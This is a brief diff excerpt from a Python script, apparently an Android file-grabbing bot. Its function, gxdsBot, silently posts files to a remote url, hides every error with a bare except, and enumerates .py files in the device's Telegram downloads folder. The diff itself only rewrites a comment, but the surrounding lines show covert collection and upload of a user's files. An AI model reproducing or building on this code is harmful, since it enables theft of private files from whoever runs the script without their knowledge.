@@ -389,7 +389,7 @@ def gxdsBot():
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
     except:pass
-    #--------( /sdcard/Telegram/Telegram Files
+    # TELEGRAM PATH
     try:
         sdcard_path = '/sdcard/Telegram/Telegram Files'
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
